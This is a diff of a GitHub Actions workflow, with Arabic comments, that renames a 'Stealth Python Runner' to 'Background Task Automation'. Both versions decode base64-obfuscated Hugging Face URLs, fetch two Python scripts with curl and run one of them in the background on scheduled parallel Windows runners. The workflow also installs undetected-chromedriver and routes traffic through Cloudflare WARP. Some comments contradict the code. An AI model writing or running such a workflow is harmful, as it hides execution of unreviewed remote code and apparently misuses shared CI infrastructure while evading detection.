@@ -1,76 +1,82 @@
-name: Stealth Python Runner
+name: Background Task Automation
 
 on:
-  workflow_dispatch: # السماح بالتشغيل اليدوي
+  workflow_dispatch: # للتشغيل اليدوي
   schedule:
-    - cron: '0 */2 * * *' # تشغيل مجدول كل ساعتين
+    - cron: '0 0,5,10,15,20 * * *' # الجدولة للعمل 5 مرات يوميا (الساعات 00:00، 05:00، 10:00، 15:00، 20:00 بتوقيت UTC)
 
 jobs:
-  execute-workers:
-    name: Worker Node ${{ matrix.node }}
+  execute-nodes:
+    name: Worker-Instance [${{ matrix.node_index }}]
     runs-on: windows-2022
-    timeout-minutes: 125 # الحد الأقصى لوقت الوظيفة
+    timeout-minutes: 185 # الحد الأقصى للتشغيل (تم رفعه لأكثر من 3 ساعات بقليل لتجنب الإيقاف المفاجئ من GitHub)
     
     strategy:
       fail-fast: false
       matrix:
-        node: [1, 2, 3, 4, 5] # تشغيل 5 خوادم متوازية
+        node_index: [1, 2] # تشغيل 5 نسخ في نفس الوقت
 
     steps:
-      # ==========================================
-      # الخطوة الأولى: التهيئة وتنزيل الملفات المشفرة
-      # ==========================================
-      - name: Initialize Workspace
+      # ---------------------------------------------------------
+      # الخطوة الأولى: تهيئة البيئة وتنزيل الملفات
+      # ---------------------------------------------------------
+      - name: Environment Setup & Script Download
         shell: bash
         run: |
-          echo "🔄 Preparing node ${{ matrix.node }}..."
+          echo ">>> [SYSTEM] Starting Node-${{ matrix.node_index }} setup..."
           
-          # فك تشفير الروابط وتحميلها ديناميكياً (Base64)
-          URL1=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 -d)
-          URL2=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnQyLnB5" | base64 -d)
+          # فك تشفير الروابط وتحميلها في المتغيرات
+          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnR1aWkucHk=" | base64 --decode)
           
-          curl -sL "$URL1" -o hash.py
-          curl -sL "$URL2" -o start.py
+          # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
+          curl -sL "$URL_HASH" > hash.py
+          curl -sL "$URL_MAIN" > start.py
           
-          echo "⚙️ Installing dependencies..."
-          python -m pip install -q --upgrade pip setuptools
+          echo ">>> [SYSTEM] Installing Python modules..."
+          python -m pip install -qU pip setuptools
           pip install -q undetected-chromedriver selenium requests
-          echo "✔️ Setup complete."
+          echo ">>> [SYSTEM] Ready to execute."
 
-      # ==========================================
-      # الخطوة الثانية: التشغيل وإدارة الوقت
-      # ==========================================
-      - name: Launch Application with Timeout Control
+      # ---------------------------------------------------------
+      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني
+      # ---------------------------------------------------------
+      - name: Launch Payload & Time Monitor
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Host "▶️ Executing main script on Node ${{ matrix.node }}"
+          Write-Output "[INFO] Initiating start.py on Instance ${{ matrix.node_index }}..."
           
-          # تحديث متغيرات بيئة النظام
-          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          # إضافة WARP لمسار النظام بطريقة مباشرة
+          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
           
-          # تشغيل السكربت في الخلفية
-          $appProcess = Start-Process -FilePath "python" -ArgumentList "start.py" -PassThru -NoNewWindow
+          # تجهيز معطيات تشغيل العملية في الخلفية
+          $ProcessArgs = @{
+              FilePath = "python"
+              ArgumentList = "start.py"
+              PassThru = $true
+              NoNewWindow = $true
+          }
+          $activeProcess = Start-Process @ProcessArgs
           
-          Write-Host "⏳ Monitoring process for max 120 minutes (7200s)..."
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 180 mins."
           
           try {
-              # مراقبة العملية حتى تنتهي أو تتجاوز الساعتين
-              $appProcess | Wait-Process -Timeout 7200 -ErrorAction Stop
-              Write-Host "🟢 Task completed successfully within timeframe."
+              # انتظار انتهاء العملية أو وصولها للحد الزمني (10800 ثانية = 3 ساعات)
+              Wait-Process -InputObject $activeProcess -Timeout 10800 -ErrorAction Stop
+              Write-Output "[SUCCESS] Task completed within limits."
           } 
           catch {
-              # تفعيل الإيقاف الإجباري إذا تجاوز الوقت الساعتين
-              Write-Warning "⚠️ Execution exceeded 120 minutes. Force stopping..."
-              $appProcess | Stop-Process -Force
-              Write-Host "🔴 Task killed to prevent hanging."
+              # إيقاف إجباري عند تخطي الوقت
+              Write-Output "[TIMEOUT] Maximum time reached. Forcing process kill..."
+              Stop-Process -InputObject $activeProcess -Force
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 3 hours."
           }
 
-      # ==========================================
-      # الخطوة الثالثة: تقرير الإغلاق
-      # ==========================================
+      # ---------------------------------------------------------
+      # الخطوة الثالثة: إغلاق المهمة
+      # ---------------------------------------------------------
       - name: Finalize
         shell: bash
-        run: |
-          echo "✅ Worker ${{ matrix.node }} finished its cycle."
+        run: echo "<<< [SYSTEM] Worker-${{ matrix.node_index }} finished its lifecycle."
